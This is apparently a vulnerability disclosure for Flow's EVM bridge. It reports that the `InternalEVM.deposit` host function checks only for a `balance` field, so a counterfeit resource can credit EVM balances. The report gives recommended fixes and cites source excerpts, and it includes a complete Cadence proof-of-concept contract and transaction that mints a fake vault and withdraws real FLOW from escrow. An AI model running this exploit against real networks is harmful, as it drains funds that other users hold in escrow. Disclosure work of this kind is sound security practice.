### Title
Missing `FlowToken.Vault` Type Validation in `InternalEVM.deposit` Allows Arbitrary Resource Deposit to Inflate EVM Bridge Balances - (File: `fvm/evm/impl/impl.go`)

---

### Summary

The `InternalEVM.deposit` host function accepts `@AnyResource` as its `from` parameter and only validates the presence of a `balance: UFix64` field on the passed resource — it never verifies the resource is actually a `FlowToken.Vault`. A malicious Cadence contract author can call `InternalEVM.deposit` directly with a crafted resource, crediting an EVM account with FLOW tokens without depositing real FLOW into the bridge escrow, then withdraw real FLOW tokens via `CadenceOwnedAccount.withdraw()`.

---

### Finding Description

The Sema (type-checker) signature for `InternalEVM.deposit` declares the `from` parameter as `sema.AnyResourceType`: [1](#0-0) 

This means the Cadence type-checker permits any resource to be passed to `InternalEVM.deposit`. The Go-level host function implementation (`newInternalEVMTypeDepositFunction`) then only checks that the passed composite value has a field named `"balance"` of type `UFix64`: [2](#0-1) 

There is no check of the resource's type location, qualified identifier, or contract address to confirm it is a genuine `FlowToken.Vault`. The function proceeds to credit the EVM account with the extracted `balance` amount: [3](#0-2) 

The public-facing Cadence wrapper `EVMAddress.deposit(from: @FlowToken.Vault)` does enforce the correct type at the Cadence level: [4](#0-3) 

However, because `InternalEVM` is a built-in contract registered in the FVM and importable from Cadence code, a malicious contract author can bypass the wrapper and call `InternalEVM.deposit` directly with a crafted resource that has a `balance: UFix64` field but is not a real `FlowToken.Vault`. The vault is intentionally not destroyed in the host function (as noted in the comment at line 670–673), so the real FLOW token supply is not reduced, yet the EVM account balance is inflated. [5](#0-4) 

---

### Impact Explanation

An attacker who deploys a Cadence contract containing a resource with a `balance: UFix64` field can:

1. Create an instance of the fake vault with an arbitrary `balance` value.
2. Call `InternalEVM.deposit(from: <-fakeVault, to: attackerEVMAddress)` directly, bypassing the `@FlowToken.Vault` type check in the wrapper.
3. The EVM account's balance is inflated by the fake `balance` amount without any real FLOW tokens being locked in the bridge escrow.
4. Call `EVM.CadenceOwnedAccount.withdraw(balance: ...)` to extract real FLOW tokens from the bridge escrow vault.

This constitutes **bridge escrow mis-accounting and cross-VM asset loss**: real FLOW tokens are drained from the protocol's EVM bridge escrow without a corresponding deposit of real FLOW. [6](#0-5) 

---

### Likelihood Explanation

The attacker entry path requires only:
- Deploying a Cadence contract (unprivileged, permissionless on Flow mainnet)
- Importing `InternalEVM` and calling `deposit` with the crafted resource

No staked node control, admin keys, or social engineering is required. The `InternalEVM` contract is a built-in registered in the FVM and used directly in `contract.cdc`, making it importable from user-deployed Cadence contracts. The type mismatch is invisible to the Cadence type-checker because the parameter is declared as `@AnyResource`.

---

### Recommendation

1. Change the `from` parameter type in `InternalEVMTypeDepositFunctionType` from `sema.AnyResourceType` to the concrete `FlowToken.Vault` Sema type, so the Cadence type-checker rejects non-FlowToken resources at compile time.
2. Add a runtime type assertion in `newInternalEVMTypeDepositFunction` to verify `fromValue`'s location and qualified identifier match `FlowToken.Vault` before extracting the balance, analogous to how `newInternalEVMTypeWithdrawFunction` constructs the returned vault with an explicit `FlowToken.Vault` location: [7](#0-6) 

---

### Proof of Concept

```cadence
// Step 1: Attacker deploys this contract
access(all) contract AttackerContract {
    access(all) resource FakeVault {
        access(all) var balance: UFix64
        init(balance: UFix64) { self.balance = balance }
    }
    access(all) fun createFakeVault(balance: UFix64): @FakeVault {
        return <- create FakeVault(balance: balance)
    }
}

// Step 2: Attacker transaction
import InternalEVM from <EVMContractAddress>
import AttackerContract from <AttackerAddress>
import EVM from <EVMContractAddress>

transaction {
    prepare(signer: auth(Storage) &Account) {
        // Create a fake vault with 1000 FLOW balance (no real FLOW deposited)
        let fakeVault <- AttackerContract.createFakeVault(balance: 1000.0)

        // Deposit fake vault directly into attacker's EVM address,
        // bypassing the @FlowToken.Vault type check in EVMAddress.deposit
        let attackerEVMBytes: [UInt8; 20] = [/* attacker EVM address bytes */]
        InternalEVM.deposit(from: <-fakeVault, to: attackerEVMBytes)

        // Step 3: Withdraw real FLOW from the bridge escrow
        let coa = signer.storage.borrow<auth(EVM.Withdraw) &EVM.CadenceOwnedAccount>(
            from: /storage/coa
        )!
        let realFlowVault <- coa.withdraw(balance: EVM.Balance(attoflow: 1000_000_000_000_000_000_000))
        // realFlowVault now contains 1000 real FLOW tokens drained from the bridge escrow
        destroy realFlowVault
    }
}
```

The root cause is in `fvm/evm/impl/impl.go` (`newInternalEVMTypeDepositFunction`, lines 631–684) and `fvm/evm/stdlib/contract.go` (`InternalEVMTypeDepositFunctionType`, lines 424–436).

### Citations

**File:** fvm/evm/stdlib/contract.go (L424-436)
```go
var InternalEVMTypeDepositFunctionType = &sema.FunctionType{
	Parameters: []sema.Parameter{
		{
			Label:          "from",
			TypeAnnotation: sema.NewTypeAnnotation(sema.AnyResourceType),
		},
		{
			Label:          "to",
			TypeAnnotation: sema.NewTypeAnnotation(EVMAddressBytesType),
		},
	},
	ReturnTypeAnnotation: sema.NewTypeAnnotation(sema.VoidType),
}
```

**File:** fvm/evm/impl/impl.go (L643-656)
```go
			fromValue, ok := invocation.Arguments[0].(*interpreter.CompositeValue)
			if !ok {
				panic(errors.NewUnreachableError())
			}

			amountValue, ok := fromValue.GetField(
				context,
				fungibleTokenVaultTypeBalanceFieldName,
			).(interpreter.UFix64Value)
			if !ok {
				panic(errors.NewUnreachableError())
			}

			amount := types.NewBalanceFromUFix64(cadence.UFix64(amountValue.UFix64Value))
```

**File:** fvm/evm/impl/impl.go (L670-681)
```go
			// NOTE: We're intentionally not destroying the vault here,
			// because the value of it is supposed to be "kept alive".
			// Destroying would incorrectly be equivalent to a burn and decrease the total supply,
			// and a withdrawal would then have to perform an actual mint of new tokens.

			// Deposit

			const isAuthorized = false
			account := handler.AccountByAddress(toAddress, isAuthorized)
			account.Deposit(types.NewFlowTokenVault(amount))

			return interpreter.Void
```

**File:** fvm/evm/impl/impl.go (L804-824)
```go
			return interpreter.NewCompositeValue(
				context,
				common.NewAddressLocation(gauge, handler.FlowTokenAddress(), "FlowToken"),
				"FlowToken.Vault",
				common.CompositeKindResource,
				[]interpreter.CompositeField{
					{
						Name: "balance",
						Value: interpreter.NewUFix64Value(gauge, func() uint64 {
							return uint64(ufix)
						}),
					},
					{
						Name: sema.ResourceUUIDFieldName,
						Value: interpreter.NewUInt64Value(gauge, func() uint64 {
							return handler.GenerateResourceUUID()
						}),
					},
				},
				common.ZeroAddress,
			)
```

**File:** fvm/evm/stdlib/contract.cdc (L200-223)
```text
        /// Deposits the given vault into the EVM account with the given address
        access(all)
        fun deposit(from: @FlowToken.Vault) {
            pre {
                !EVM.isPaused(): "EVM operations are temporarily paused"
            }

            let amount = from.balance
            if amount == 0.0 {
                destroy from
                return
            }
            let depositedUUID = from.uuid
            InternalEVM.deposit(
                from: <-from,
                to: self.bytes
            )
            emit FLOWTokensDeposited(
                address: self.toString(),
                amount: amount,
                depositedUUID: depositedUUID,
                balanceAfterInAttoFlow: self.balance().attoflow
            )
        }
```

**File:** fvm/evm/stdlib/contract.cdc (L586-606)
```text
        access(Owner | Withdraw)
        fun withdraw(balance: Balance): @FlowToken.Vault {
            pre {
                !EVM.isPaused(): "EVM operations are temporarily paused"
            }

            if balance.isZero() {
                return <-FlowToken.createEmptyVault(vaultType: Type<@FlowToken.Vault>())
            }
            let vault <- InternalEVM.withdraw(
                from: self.addressBytes,
                amount: balance.attoflow
            ) as! @FlowToken.Vault
            emit FLOWTokensWithdrawn(
                address: self.address().toString(),
                amount: balance.inFLOW(),
                withdrawnUUID: vault.uuid,
                balanceAfterInAttoFlow: self.balance().attoflow
            )
            return <-vault
        }
```
